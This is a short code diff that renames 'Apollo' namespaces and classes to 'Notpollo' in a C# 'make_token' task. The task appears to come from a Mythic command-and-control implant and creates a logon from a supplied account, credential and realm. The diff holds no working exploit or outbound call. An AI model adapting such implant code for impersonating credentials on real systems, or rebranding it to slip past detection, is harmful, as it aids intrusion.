@@ -6,10 +6,10 @@
 
 #if MAKE_TOKEN
 
-using ApolloInterop.Classes;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.ApolloStructs;
-using ApolloInterop.Structs.MythicStructs;
+using NotpolloInterop.Classes;
+using NotpolloInterop.Interfaces;
+using NotpolloInterop.Structs.NotpolloStructs;
+using NotpolloInterop.Structs.MythicStructs;
 using System;
 using System.Collections.Generic;
 using System.Linq;
@@ -28,7 +28,7 @@ namespace Tasks
             [DataMember(Name = "credential")]
             public Credential Credential;
         }
-        public make_token(IAgent agent, ApolloInterop.Structs.MythicStructs.Task data) : base(agent, data)
+        public make_token(IAgent agent, NotpolloInterop.Structs.MythicStructs.Task data) : base(agent, data)
         {
         }
         public override void Start()
@@ -49,7 +49,7 @@ namespace Tasks
             }
             else
             {
-                ApolloLogonInformation info = new ApolloLogonInformation(
+                NotpolloLogonInformation info = new NotpolloLogonInformation(
                     parameters.Credential.Account,
                     parameters.Credential.CredentialMaterial,
                     parameters.Credential.Realm);
